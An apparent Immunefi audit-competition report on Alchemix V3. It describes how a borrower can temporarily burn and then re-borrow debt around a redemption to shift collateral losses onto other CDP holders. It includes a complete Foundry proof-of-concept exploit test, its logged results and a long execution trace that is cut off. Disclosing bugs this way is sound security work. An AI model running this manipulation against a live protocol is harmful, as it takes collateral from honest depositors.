# 58628 sc high attackers can avoid redemption losses by temporarily burning and re borrowing the debt

**Submitted on Nov 3rd 2025 at 17:39:56 UTC by @XDZIBECX for** [**Audit Comp | Alchemix V3**](https://immunefi.com/audit-competition/alchemix-v3-audit-competition)

* **Report ID:** #58628
* **Report Type:** Smart Contract
* **Report severity:** High
* **Target:** <https://github.com/alchemix-finance/v3-poc/blob/immunefi\\_audit/src/AlchemistV3.sol>
* **Impacts:**
  * Theft of unclaimed yield

## Description

## Brief/Intro

there is an issuse in this contract in the opeation of how it distributes the redemption losses among the CDP holders, because When a redemption occurs, the protocol uses a weight-based formula to fairly split the collateral loss across all users based on their debt positions, but an attacker can exploit a missing time-lock and make a manipulation, attackers can temporarily burn (repay) half of their debt right before a large redemption happens, and this is makes the protocol think there's less total debt than there actually is. so as result this will cause the protocol to calculate a higher loss percentage for everyone. But since the attacker has temporarily reduced their debt, they experience this higher percentage on a smaller amount, resulting in less loss. and after the redemption, the attacker re-borrows the same amount they burned. this is gone result that the attacker pays only 60-70% of their fair share of the redemption costs, while the users pay 130-140% of theirs. check the poc i use a scenarion confirm this , so this is allows attacker to steal 1,666 tokens from another user on a single 10,000 token redemption this need to be fixed ..

## Vulnerability Details

the root of the bug is the mint is miss a check that is prevente users from minting in the same block after burning, the burn fucntion is blocks the burning after minting in the same block; and this asymmetry it's enables a temporarily reducing debt before a redemption to manipulate the global weight calculation and reduce the attacker's losses while increasing others' losses.

the vulnerability is came from this interconnected code here, the `burn` function is prevents the same-block repayment after minting from this --> <https://github.com/alchemix-finance/v3-poc/blob/a192ab313c81ba3ab621d9ca1ee000110fbdd1e9/src/AlchemistV3.sol#L453C1-L496C1>

```solidity
    function burn(uint256 amount, uint256 recipientId) external returns (uint256) {
        _checkArgument(amount > 0);
        _checkForValidAccountId(recipientId);
        // Check that the user did not mint in this same block
        // This is used to prevent flash loan repayments
        if (block.number == _accounts[recipientId].lastMintBlock) revert CannotRepayOnMintBlock(); 


```

but there is a missing of Time-Lock in the `mint` Function the fucntion doesn't check if the user just burned debt or not here --> <https://github.com/alchemix-finance/v3-poc/blob/a192ab313c81ba3ab621d9ca1ee000110fbdd1e9/src/AlchemistV3.sol#L417C1-L433C6> :

```solidity
function mint(uint256 tokenId, uint256 amount, address recipient) external {
    _checkArgument(recipient != address(0));
    _checkForValidAccountId(tokenId);
    _checkArgument(amount > 0);
    _checkState(!loansPaused);
    _checkAccountOwnership(IAlchemistV3Position(alchemistPositionNFT).ownerOf(tokenId), msg.sender);

    // Query transmuter and earmark global debt
    _earmark();

    // Sync current user debt before more is taken
    _sync(tokenId);

    // Mint tokens to recipient
    _mint(tokenId, amount, recipient);
}
```

* and the `Account` struct confirms this because it only tracks `lastMintBlock`, not `lastBurnBlock` here ---> <https://github.com/alchemix-finance/v3-poc/blob/a192ab313c81ba3ab621d9ca1ee000110fbdd1e9/src/interfaces/IAlchemistV3.sol#L52> : so this a problem because users can burn debt and immediately mint it back in the next block.
* this state of manipulation it's happen as this , when a user burns debt, the `_subDebt` function is reduces two values ---> <https://github.com/alchemix-finance/v3-poc/blob/a192ab313c81ba3ab621d9ca1ee000110fbdd1e9/src/AlchemistV3.sol#L932C1-L953C6> :

```solidity
    function _subDebt(uint256 tokenId, uint256 amount) internal {
        Account storage account = _accounts[tokenId];

        // Update collateral variables
        uint256 toFree = convertDebtTokensToYield(amount) * minimumCollateralization / FIXED_POINT_SCALAR;
        uint256 lockedCollateral = convertDebtTokensToYield(account.debt) * minimumCollateralization / FIXED_POINT_SCALAR;

        // For cases when someone above minimum LTV gets liquidated.
        if (toFree > _totalLocked) {
            toFree = _totalLocked;
        }

        account.debt -= amount;
        totalDebt -= amount;
        _totalLocked -= toFree; << here where is reduces GLOBAL locked collateral
        account.rawLocked = lockedCollateral - toFree; << here where is reduces the  USER's locked collateral

        // Clamp to avoid underflow due to rounding later at a later time
        if (cumulativeEarmarked > totalDebt) {
            cumulativeEarmarked = totalDebt;
        }
```

and this reductions are immediate and global, so when an attackers is burns debt, they reduce, their own `rawLocked` and the global `_totalLocked` , so When a redemption is happens, it calculates a "weight" to determine how much collateral each user should lose. and this weight is based on the global `_totalLocked` here --> <https://github.com/alchemix-finance/v3-poc/blob/a192ab313c81ba3ab621d9ca1ee000110fbdd1e9/src/AlchemistV3.sol#L631C9-L635C1> :

```solidity
        // update locked collateral + collateral weight
        uint256 old = _totalLocked; << here  it's Uses the current total, which may be artificially low
        _totalLocked = totalOut > old ? 0 : old - totalOut;
        _collateralWeight += PositionDecay.WeightIncrement(totalOut > old ? old : totalOut, old);
```

the weight formula is---> `WeightIncrement(amount, total) = -log2((total - amount) / total)` so when the `total` is smaller, the weight is larger.this is means, the normal redemption with `_totalLocked = 10,000` is creates a weight of \~0.152 , and the manipulated redemption with `_totalLocked = 9,500` is Creates weight of \~0.160 (higher!)

* When users sync to apply the redemption loss, the calculation uses their current `rawLocked` on this line --> <https://github.com/alchemix-finance/v3-poc/blob/a192ab313c81ba3ab621d9ca1ee000110fbdd1e9/src/AlchemistV3.sol#L1045C8-L1047C57> :

```solidity
        // Collateral to remove from redemptions and fees
        uint256 collateralToRemove = PositionDecay.ScaleByWeightDelta(account.rawLocked, _collateralWeight - account.lastCollateralWeight);
        account.collateralBalance -= collateralToRemove;
```

## Impact Details

i use this as high because the attack that can came from this bug is can enables attackers to steal collateral from other CDP holders during the redemption, so time a significant redemption occurs in the Transmuter, then a malicious users can front-run it by temporarily reducing their debt position, and cause the redemption weight calculation to be based on deflated global locked collateral. and this is create a loss, and attackers can avoid 30-40% of their fair share of redemption losses, with that burden shifted to honest users who pay 30-40% more than they should. as an example i use in the test result on a 100,000 token redemption, an attacker save approximately 16,666 tokens while other users collectively lose that same amount extra a direct wealth transfer.

## References

i use all on the vulnerability details

## Proof of Concept

## Proof of Concept

here is a test show and confirm the isssue copy past this in the and run it as

```solidity
 function test_POC_RedemptionSandwichAttack_TheftOfYield() external {
        console.log("\n=== POC: Redemption Sandwich Attack ===\n");
        
        // Setup: Two users with identical positions
        uint256 depositAmount = 100_000e18;
        uint256 mintAmount = 50_000e18;
        
        // === Setup Alice (Attacker) ===
        address alice = address(0xA11CE);
        // Give Alice vault tokens using the magic deposit helper
        _magicDepositToVault(address(vault), alice, depositAmount);
        
        vm.startPrank(alice);
        SafeERC20.safeApprove(address(vault), address(alchemist), type(uint256).max);
        alchemist.deposit(depositAmount, alice, 0);
        uint256 aliceTokenId = AlchemistNFTHelper.getFirstTokenId(alice, address(alchemistNFT));
        alchemist.mint(aliceTokenId, mintAmount, alice);
        vm.stopPrank();
        
        // === Setup Bob (Victim) ===
        address bob = address(0xB0B);
        // Give Bob vault tokens using the magic deposit helper
        _magicDepositToVault(address(vault), bob, depositAmount);
        
        vm.startPrank(bob);
        SafeERC20.safeApprove(address(vault), address(alchemist), type(uint256).max);
        alchemist.deposit(depositAmount, bob, 0);
        uint256 bobTokenId = AlchemistNFTHelper.getFirstTokenId(bob, address(alchemistNFT));
        alchemist.mint(bobTokenId, mintAmount, bob);
        vm.stopPrank();
        
        // Record initial balances
        (uint256 aliceCollateralBefore, uint256 aliceDebtBefore,) = alchemist.getCDP(aliceTokenId);
        (uint256 bobCollateralBefore, uint256 bobDebtBefore,) = alchemist.getCDP(bobTokenId);
        
        console.log("Initial State:");
        console.log("  Alice Collateral:", aliceCollateralBefore / 1e18);
        console.log("  Alice Debt:", aliceDebtBefore / 1e18);
        console.log("  Bob Collateral:", bobCollateralBefore / 1e18);
        console.log("  Bob Debt:", bobDebtBefore / 1e18);
        console.log("");
        
        // === SCENARIO A: Normal Redemption (Fair Distribution) ===
        console.log("--- Scenario A: Normal Redemption (No Attack) ---");
        
        // Snapshot state before redemption
        uint256 snapshotId = vm.snapshot();
        
        // Create and process large redemption
        uint256 redemptionAmount = 10_000e18;
        deal(address(alToken), address(0xdad), redemptionAmount);
        vm.startPrank(address(0xdad));
        IERC20(alToken).approve(address(transmuterLogic), redemptionAmount);
        transmuterLogic.createRedemption(redemptionAmount);
        vm.roll(block.number + 5_256_000); // Fast forward to maturity
        transmuterLogic.claimRedemption(1);
        vm.stopPrank();
        
        // Sync both users to see redemption impact
        alchemist.poke(aliceTokenId);
        alchemist.poke(bobTokenId);
        
        (uint256 aliceCollateralNormal, uint256 aliceDebtNormal,) = alchemist.getCDP(aliceTokenId);
        (uint256 bobCollateralNormal, uint256 bobDebtNormal,) = alchemist.getCDP(bobTokenId);
        
        uint256 aliceCollateralLossNormal = aliceCollateralBefore - aliceCollateralNormal;
        uint256 bobCollateralLossNormal = bobCollateralBefore - bobCollateralNormal;
        
        console.log("After Normal Redemption:");
        console.log("  Alice Collateral Loss:", aliceCollateralLossNormal / 1e18);
        console.log("  Bob Collateral Loss:", bobCollateralLossNormal / 1e18);
        console.log("  Total Loss:", (aliceCollateralLossNormal + bobCollateralLossNormal) / 1e18);
        console.log("");
        
        // Restore to pre-redemption state
        vm.revertTo(snapshotId);
        
        // === SCENARIO B: Sandwich Attack ===
        console.log("--- Scenario B: With Sandwich Attack ---");
        
        // Step 1: Alice front-runs by burning half her debt
        uint256 burnAmount = mintAmount / 2; // Burn 50% of debt
        vm.startPrank(alice);
        vm.roll(block.number + 1); // Move to next block (can't burn same block as mint)
        SafeERC20.safeApprove(address(alToken), address(alchemist), burnAmount);
        alchemist.burn(burnAmount, aliceTokenId);
        vm.stopPrank();
        
        (uint256 aliceCollateralAfterBurn, uint256 aliceDebtAfterBurn,) = alchemist.getCDP(aliceTokenId);
        console.log("After Alice Burns Debt:");
        console.log("  Alice Debt Reduced:", (aliceDebtBefore - aliceDebtAfterBurn) / 1e18);
        console.log("  Alice Collateral:", aliceCollateralAfterBurn / 1e18);
        console.log("");
        
        // Step 2: Large redemption occurs (victim transaction)
        vm.roll(block.number + 1);
        deal(address(alToken), address(0xdad), redemptionAmount);
        vm.startPrank(address(0xdad));
        IERC20(alToken).approve(address(transmuterLogic), redemptionAmount);
        transmuterLogic.createRedemption(redemptionAmount);
        vm.roll(block.number + 5_256_000);
        transmuterLogic.claimRedemption(1);
        vm.stopPrank();
        
        // Step 3: Alice back-runs by re-borrowing
        vm.roll(block.number + 1);
        vm.startPrank(alice);
        SafeERC20.safeApprove(address(alToken), address(alchemist), 0);
        alchemist.mint(aliceTokenId, burnAmount, alice); // Re-borrow the same amount
        vm.stopPrank();
        
        // Sync both users to see final state
        alchemist.poke(aliceTokenId);
        alchemist.poke(bobTokenId);
        
        (uint256 aliceCollateralAttack, uint256 aliceDebtAttack,) = alchemist.getCDP(aliceTokenId);
        (uint256 bobCollateralAttack, uint256 bobDebtAttack,) = alchemist.getCDP(bobTokenId);
        
        uint256 aliceCollateralLossAttack = aliceCollateralBefore - aliceCollateralAttack;
        uint256 bobCollateralLossAttack = bobCollateralBefore - bobCollateralAttack;
        
        console.log("After Sandwich Attack:");
        console.log("  Alice Collateral Loss:", aliceCollateralLossAttack / 1e18);
        console.log("  Bob Collateral Loss:", bobCollateralLossAttack / 1e18);
        console.log("  Total Loss:", (aliceCollateralLossAttack + bobCollateralLossAttack) / 1e18);
        console.log("");
        
        // === PROOF OF THEFT ===
        console.log("=== PROOF OF THEFT ===");
        
        // Alice should lose the same as Bob (they started equal)
        // But due to the attack, Alice loses LESS
        uint256 aliceSavings = aliceCollateralLossNormal - aliceCollateralLossAttack;
        uint256 bobExtraLoss = bobCollateralLossAttack - bobCollateralLossNormal;
        
        console.log("Alice's Unfair Savings:", aliceSavings / 1e18);
        console.log("Bob's Extra Loss:", bobExtraLoss / 1e18);
        console.log("Wealth Stolen from Bob:", bobExtraLoss / 1e18);
        console.log("");
        
        // Assertions proving the theft
        // 1. Alice loses LESS than fair share
        assertLt(aliceCollateralLossAttack, aliceCollateralLossNormal, "Alice should lose LESS with attack");
        
        // 2. Bob loses MORE than fair share
        assertGt(bobCollateralLossAttack, bobCollateralLossNormal, "Bob should lose MORE when Alice attacks");
        
        // 3. Alice's savings approximately equals Bob's extra loss (wealth transfer)
        assertApproxEqRel(aliceSavings, bobExtraLoss, 0.05e18, "Wealth transfer from Bob to Alice");
        
        // 4. The difference is significant (not rounding error)
        assertGt(aliceSavings, 100e18, "Savings must be significant (>100 tokens)");
        
        console.log("VULNERABILITY CONFIRMED: Alice stole yield from Bob");
        console.log("Impact: HIGH - Theft of Unclaimed Yield");
        console.log("Alice avoided her fair share of redemption losses");
        console.log("Bob paid more than his fair share");
        console.log("Net wealth transfer from honest user to attacker\n");
    }
}

```

* the result are show as :

```solidity

Ran 1 test for src/test/AlchemistV3.t.sol:AlchemistV3Test
[PASS] test_POC_RedemptionSandwichAttack_TheftOfYield() (gas: 6469151)
Logs:

=== POC: Redemption Sandwich Attack ===

  Initial State:
    Alice Collateral: 100000
    Alice Debt: 50000
    Bob Collateral: 100000
    Bob Debt: 50000

  --- Scenario A: Normal Redemption (No Attack) ---
  After Normal Redemption:
    Alice Collateral Loss: 5000
    Bob Collateral Loss: 5000
    Total Loss: 10000

  --- Scenario B: With Sandwich Attack ---
  After Alice Burns Debt:
    Alice Debt Reduced: 25000
    Alice Collateral: 100000

  After Sandwich Attack:
    Alice Collateral Loss: 3333
    Bob Collateral Loss: 6666
    Total Loss: 10000

  === PROOF OF THEFT ===
  Alice's Unfair Savings: 1666
  Bob's Extra Loss: 1666
  Wealth Stolen from Bob: 1666

  VULNERABILITY CONFIRMED: Alice stole yield from Bob
  Impact: HIGH - Theft of Unclaimed Yield
  Alice avoided her fair share of redemption losses
  Bob paid more than his fair share
  Net wealth transfer from honest user to attacker


Traces:
  [7493651] AlchemistV3Test::test_POC_RedemptionSandwichAttack_TheftOfYield()
    ├─ [0] console::log("\n=== POC: Redemption Sandwich Attack ===\n") [staticcall]
    │   └─ ← [Stop]
    ├─ [2931] TestERC20::balanceOf(0x00000000000000000000000000000000000A11cE) [staticcall]      
    │   └─ ← [Return] 0
    ├─ [0] VM::record()
    │   └─ ← [Return]
    ├─ [931] TestERC20::balanceOf(0x00000000000000000000000000000000000A11cE) [staticcall]       
    │   └─ ← [Return] 0
    ├─ [0] VM::accesses(TestERC20: [0xf9ee71f54F2009fD180C480e44a5176AdCABa5eA])
    │   └─ ← [Return] [0x533c587bffbb1637d85d51c2579f057bd7b064547450f2adf0221dd98ef613de], []   
    ├─ [0] VM::load(TestERC20: [0xf9ee71f54F2009fD180C480e44a5176AdCABa5eA], 0x533c587bffbb1637d85d51c2579f057bd7b064547450f2adf0221dd98ef613de) [staticcall]
    │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
    ├─ emit WARNING_UninitedSlot(who: TestERC20: [0xf9ee71f54F2009fD180C480e44a5176AdCABa5eA], slot: 37648587952981368340622553092175482322186215906096867907252668501185348899806 [3.764e76])    
    ├─ [0] VM::load(TestERC20: [0xf9ee71f54F2009fD180C480e44a5176AdCABa5eA], 0x533c587bffbb1637d85d51c2579f057bd7b064547450f2adf0221dd98ef613de) [staticcall]
    │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
    ├─ [931] TestERC20::balanceOf(0x00000000000000000000000000000000000A11cE) [staticcall]       
    │   └─ ← [Return] 0
    ├─ [0] VM::store(TestERC20: [0xf9ee71f54F2009fD180C480e44a5176AdCABa5eA], 0x533c587bffbb1637d85d51c2579f057bd7b064547450f2adf0221dd98ef613de, 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff)
    │   └─ ← [Return]
    ├─ [931] TestERC20::balanceOf(0x00000000000000000000000000000000000A11cE) [staticcall]       
    │   └─ ← [Return] 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77]
    ├─ [0] VM::store(TestERC20: [0xf9ee71f54F2009fD180C480e44a5176AdCABa5eA], 0x533c587bffbb1637d85d51c2579f057bd7b064547450f2adf0221dd98ef613de, 0x0000000000000000000000000000000000000000000000000000000000000000)
    │   └─ ← [Return]
    ├─ emit SlotFound(who: TestERC20: [0xf9ee71f54F2009fD180C480e44a5176AdCABa5eA], fsig: 0x70a08231, keysHash: 0x9ee878158fd03ad640d4a0705a30c697ca9fe067e51ec5dde8bf6b55f41c298c, slot: 37648587952981368340622553092175482322186215906096867907252668501185348899806 [3.764e76])
    ├─ [0] VM::load(TestERC20: [0xf9ee71f54F2009fD180C480e44a5176AdCABa5eA], 0x533c587bffbb1637d85d51c2579f057bd7b064547450f2adf0221dd98ef613de) [staticcall]
    │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
    ├─ [0] VM::store(TestERC20: [0xf9ee71f54F2009fD180C480e44a5176AdCABa5eA], 0x533c587bffbb1637d85d51c2579f057bd7b064547450f2adf0221dd98ef613de, 0x00000000000000000000000000000000000000000000152d02c7e14af6800000)
    │   └─ ← [Return]
    ├─ [931] TestERC20::balanceOf(0x00000000000000000000000000000000000A11cE) [staticcall]       
    │   └─ ← [Return] 100000000000000000000000 [1e23]
    ├─ [0] VM::startPrank(0x00000000000000000000000000000000000A11cE)
    │   └─ ← [Return]
    ├─ [25332] TestERC20::approve(MockMYTVault: [0xd7D9fC89347Cc01C7707010604E99D146AC0C3BF], 100000000000000000000000 [1e23])
    │   ├─ emit Approval(owner: 0x00000000000000000000000000000000000A11cE, spender: MockMYTVault: [0xd7D9fC89347Cc01C7707010604E99D146AC0C3BF], value: 100000000000000000000000 [1e23])
    │   └─ ← [Return] true
    ├─ [120737] MockMYTVault::deposit(100000000000000000000000 [1e23], 0x00000000000000000000000000000000000A11cE)
    │   ├─ [2931] TestERC20::balanceOf(MockMYTVault: [0xd7D9fC89347Cc01C7707010604E99D146AC0C3BF]) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [22120] MockMYTStrategy::realAssets() [staticcall]
    │   │   ├─ [3051] MockYieldToken::balanceOf(MockMYTStrategy: [0xF62849F9A0B5Bf2913b396098F7c7019b51A820a]) [staticcall]
    │   │   │   └─ ← [Return] 1000000000000000000000000 [1e24]
    │   │   ├─ [12941] MockYieldToken::price() [staticcall]
    │   │   │   ├─ [2931] TestERC20::balanceOf(MockYieldToken: [0x8E8149E630eD0e6D24Ec34d667fd4351bc113CE0]) [staticcall]
    │   │   │   │   └─ ← [Return] 1000000000000000000000000 [1e24]
    │   │   │   └─ ← [Return] 1000000000000000000 [1e18]
    │   │   ├─ [553] MockYieldToken::decimals() [staticcall]
    │   │   │   └─ ← [Return] 18
    │   │   └─ ← [Return] 1000000000000000000000000 [1e24]
    │   ├─ emit AccrueInterest(previousTotalAssets: 1000000000000000000000000 [1e24], newTotalAssets: 1000000000000000000000000 [1e24], performanceFeeShares: 0, managementFeeShares: 0)
    │   ├─ [26300] TestERC20::transferFrom(0x00000000000000000000000000000000000A11cE, MockMYTVault: [0xd7D9fC89347Cc01C7707010604E99D146AC0C3BF], 100000000000000000000000 [1e23])
    │   │   ├─ emit Transfer(from: 0x00000000000000000000000000000000000A11cE, to: MockMYTVault: [0xd7D9fC89347Cc01C7707010604E99D146AC0C3BF], value: 100000000000000000000000 [1e23])
    │   │   └─ ← [Return] true
    │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: 0x00000000000000000000000000000000000A11cE, value: 100000000000000000000000 [1e23])
    │   ├─ emit Deposit(sender: 0x00000000000000000000000000000000000A11cE, owner: 0x00000000000000000000000000000000000A11cE, assets: 100000000000000000000000 [1e23], shares: 100000000000000000000000 [1e23])
    │   └─ ← [Return] 100000000000000000000000 [1e23]
    ├─ [0] VM::stopPrank()
    │   └─ ← [Return]
    ├─ [0] VM::startPrank(0x00000000000000000000000000000000000A11cE)
    │   └─ ← [Return]
    ├─ [25588] MockMYTVault::approve(TransparentUpgradeableProxy: [0x48c33395391C097df9c9aA887a40f1b47948D393], 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
    │   ├─ emit Approval(owner: 0x00000000000000000000000000000000000A11cE, spender: TransparentUpgradeableProxy: [0x48c33395391C097df9c9aA887a40f1b47948D393], value: 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
    │   └─ ← [Return] true
    ├─ [257156] TransparentUpgradeableProxy::fallback(100000000000000000000000 [1e23], 0x00000000000000000000000000000000000A11cE, 0)
    │   ├─ [251932] AlchemistV3::deposit(100000000000000000000000 [1e23], 0x00000000000000000000000000000000000A11cE, 0) [delegatecall]
    │   │   ├─ [150234] AlchemistV3Position::mint(0x00000000000000000000000000000000000A11cE)    
    │   │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: 0x00000000000000000000000000000000000A11cE, tokenId: 1)
    │   │   │   └─ ← [Return] 1
    │   │   ├─ emit AlchemistV3PositionNFTMinted(to: 0x00000000000000000000000000000000000A11cE, tokenId: 1)
    │   │   ├─ [31109] MockMYTVault::transferFrom(0x00000000000000000000000000000000000A11cE, TransparentUpgradeableProxy: [0x48c33395391C097df9c9aA887a40f1b47948D393], 100000000000000000000000 [1e23])
    │   │   │   ├─ emit Transfer(from: 0x00000000000000000000000000000000000A11cE, to: TransparentUpgradeableProxy: [0x48c33395391C097df9c9aA887a40f1b47948D393], value: 100000000000000000000000 [1e23])
    │   │   │   └─ ← [Return] true
    │   │   ├─ emit Deposit(amount: 100000000000000000000000 [1e23], recipientId: 1)
    │   │   ├─ [1977] MockMYTVault::convertToAssets(100000000000000000000000 [1e23]) [staticcall]
    │   │   │   └─ ← [Return] 100000000000000000000000 [1e23]
    │   │   └─ ← [Return] 100000000000000000000000 [1e23]
    │   └─ ← [Return] 100000000000000000000000 [1e23]
    ├─ [6859] AlchemistNFTHelper::getFirstTokenId(0x00000000000000000000000000000000000A11cE, AlchemistV3Position: [0x13f8F173F6CBb87B606526853092F423537395Ad]) [delegatecall]
    │   ├─ [1300] AlchemistV3Position::balanceOf(0x00000000000000000000000000000000000A11cE) [staticcall]
    │   │   └─ ← [Return] 1
    │   ├─ [1991] AlchemistV3Position::tokenOfOwnerByIndex(0x00000000000000000000000000000000000A11cE, 0) [staticcall]
    │   │   └─ ← [Return] 1
    │   └─ ← [Return] 1
    ├─ [271208] TransparentUpgradeableProxy::fallback(1, 50000000000000000000000 [5e22], 0x00000000000000000000000000000000000A11cE)
    │   ├─ [270487] AlchemistV3::mint(1, 50000000000000000000000 [5e22], 0x00000000000000000000000000000000000A11cE) [delegatecall]
    │   │   ├─ [1265] AlchemistV3Position::ownerOf(1) [staticcall]
    │   │   │   └─ ← [Return] 0x00000000000000000000000000000000000A11cE
    │   │   ├─ [1265] AlchemistV3Position::ownerOf(1) [staticcall]
    │   │   │   └─ ← [Return] 0x00000000000000000000000000000000000A11cE
    │   │   ├─ [3602] MockMYTVault::convertToShares(0) [staticcall]
    │   │   │   └─ ← [Return] 0
    │   │   ├─ [3602] MockMYTVault::convertToShares(50000000000000000000000 [5e22]) [staticcall] 
    │   │   │   └─ ← [Return] 50000000000000000000000 [5e22]
    │   │   ├─ [3602] MockMYTVault::convertToShares(0) [staticcall]
    │   │   │   └─ ← [Return] 0
    │   │   ├─ [1977] MockMYTVault::convertToAssets(100000000000000000000000 [1e23]) [staticcall]
    │   │   │   └─ ← [Return] 100000000000000000000000 [1e23]
    │   │   ├─ [54102] AlchemicTokenV3::mint(0x00000000000000000000000000000000000A11cE, 50000000000000000000000 [5e22])
    │   │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: 0x00000000000000000000000000000000000A11cE, value: 50000000000000000000000 [5e22])
    │   │   │   └─ ← [Stop]
    │   │   ├─ emit Mint(tokenId: 1, amount: 50000000000000000000000 [5e22], recipient: 0x00000000000000000000000000000000000A11cE)
    │   │   └─ ← [Stop]
    │   └─ ← [Return]
    ├─ [0] VM::stopPrank()
    │   └─ ← [Return]
    ├─ [2931] TestERC20::balanceOf(0x0000000000000000000000000000000000000B0b) [staticcall]      
    │   └─ ← [Return] 0
    ├─ [0] VM::record()
    │   └─ ← [Return]
    ├─ [931] TestERC20::balanceOf(0x0000000000000000000000000000000000000B0b) [staticcall]       
    │   └─ ← [Return] 0
    ├─ [0] VM::accesses(TestERC20: [0xf9ee71f54F2009fD180C480e44a5176AdCABa5eA])
    │   └─ ← [Return] [0x0ec29c472d3bd76105af127f16de807101f2434788d992f33fef3161426058a1], []   
    ├─ [0] VM::load(TestERC20: [0xf9ee71f54F2009fD180C480e44a5176AdCABa5eA], 0x0ec29c472d3bd76105af127f16de807101f2434788d992f33fef3161426058a1) [staticcall]
    │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
    ├─ emit WARNING_UninitedSlot(who: TestERC20: [0xf9ee71f54F2009fD180C480e44a5176AdCABa5eA], slot: 6676226802082719110815276640613009483391484139936837993580530224282944428193 [6.676e75])     
    ├─ [0] VM::load(TestERC20: [0xf9ee71f54F2009fD180C480e44a5176AdCABa5eA], 0x0ec29c472d3bd76105af127f16de807101f2434788d992f33fef3161426058a1) [staticcall]
    │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
    ├─ [931] TestERC20::balanceOf(0x0000000000000000000000000000000000000B0b) [staticcall]       
    │   └─ ← [Return] 0
    ├─ [0] VM::store(TestERC20: [0xf9ee71f54F2009fD180C480e44a5176AdCABa5eA], 0x0ec29c472d3bd76105af127f16de807101f2434788d992f33fef3161426058a1, 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff)
    │   └─ ← [Return]
    ├─ [931] TestERC20::balanceOf(0x0000000000000000000000000000000000000B0b) [staticcall]       
    │   └─ ← [Return] 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77]
    ├─ [0] VM::store(TestERC20: [0xf9ee71f54F2009fD180C480e44a5176AdCABa5eA], 0x0ec29c472d3bd76105af127f16de807101f2434788d992f33fef3161426058a1, 0x0000000000000000000000000000000000000000000000000000000000000000)
    │   └─ ← [Return]
    ├─ emit SlotFound(who: TestERC20: [0xf9ee71f54F2009fD180C480e44a5176AdCABa5eA], fsig: 0x70a08231, keysHash: 0x3df664546288c9c5a7b1d0ce1ee5ae748f9a5691336ac256941d65602eb592aa, slot: 6676226802082719110815276640613009483391484139936837993580530224282944428193 [6.676e75])
    ├─ [0] VM::load(TestERC20: [0xf9ee71f54F2009fD180C480e44a5176AdCABa5eA], 0x0ec29c472d3bd76105af127f16de807101f2434788d992f33fef3161426058a1) [staticcall]
    │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
    ├─ [0] VM::store(TestERC20: [0xf9ee71f54F2009fD180C480e44a5176AdCABa5eA], 0x0ec29c472d3bd76105af127f16de807101f2434788d992f33fef3161426058a1, 0x00000000000000000000000000000000000000000000152d02c7e14af6800000)
    │   └─ ← [Return]
    ├─ [931] TestERC20::balanceOf(0x0000000000000000000000000000000000000B0b) [staticcall]       
    │   └─ ← [Return] 100000000000000000000000 [1e23]
    ├─ [0] VM::startPrank(0x0000000000000000000000000000000000000B0b)
    │   └─ ← [Return]
    ├─ [25332] TestERC20::approve(MockMYTVault: [0xd7D9fC89347Cc01C7707010604E99D146AC0C3BF], 100000000000000000000000 [1e23])
    │   ├─ emit Approval(owner: 0x0000000000000000000000000000000000000B0b, spender: MockMYTVault: [0xd7D9fC89347Cc01C7707010604E99D146AC0C3BF], value: 100000000000000000000000 [1e23])
    │   └─ ← [Return] true
    ├─ [46903] MockMYTVault::deposit(100000000000000000000000 [1e23], 0x0000000000000000000000000000000000000B0b)
    │   ├─ emit AccrueInterest(previousTotalAssets: 1100000000000000000000000 [1.1e24], newTotalAssets: 1100000000000000000000000 [1.1e24], performanceFeeShares: 0, managementFeeShares: 0)      
    │   ├─ [6400] TestERC20::transferFrom(0x0000000000000000000000000000000000000B0b, MockMYTVault: [0xd7D9fC89347Cc01C7707010604E99D146AC0C3BF], 100000000000000000000000 [1e23])
    │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000B0b, to: MockMYTVault: [0xd7D9fC89347Cc01C7707010604E99D146AC0C3BF], value: 100000000000000000000000 [1e23])
    │   │   └─ ← [Return] true
    │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: 0x0000000000000000000000000000000000000B0b, value: 100000000000000000000000 [1e23])
    │   ├─ emit Deposit(sender: 0x0000000000000000000000000000000000000B0b, owner: 0x0000000000000000000000000000000000000B0b, assets: 100000000000000000000000 [1e23], shares: 100000000000000000000000 [1e23])
    │   └─ ← [Return] 100000000000000000000000 [1e23]
    ├─ [0] VM::stopPrank()
    │   └─ ← [Return]
    ├─ [0] VM::startPrank(0x0000000000000000000000000000000000000B0b)
    │   └─ ← [Return]
    ├─ [25588] MockMYTVault::approve(TransparentUpgradeableProxy: [0x48c33395391C097df9c9aA887a40f1b47948D393], 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
    │   ├─ emit Approval(owner: 0x0000000000000000000000000000000000000B0b, spender: TransparentUpgradeableProxy: [0x48c33395391C097df9c9aA887a40f1b47948D393], value: 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
    │   └─ ← [Return] true
    ├─ [168456] TransparentUpgradeableProxy::fallback(100000000000000000000000 [1e23], 0x0000000000000000000000000000000000000B0b, 0)
    │   ├─ [167732] AlchemistV3::deposit(100000000000000000000000 [1e23], 0x0000000000000000000000000000000000000B0b, 0) [delegatecall]
    │   │   ├─ [124334] AlchemistV3Position::mint(0x0000000000000000000000000000000000000B0b)    
    │   │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: 0x0000000000000000000000000000000000000B0b, tokenId: 2)
    │   │   │   └─ ← [Return] 2
    │   │   ├─ emit AlchemistV3PositionNFTMinted(to: 0x0000000000000000000000000000000000000B0b, tokenId: 2)
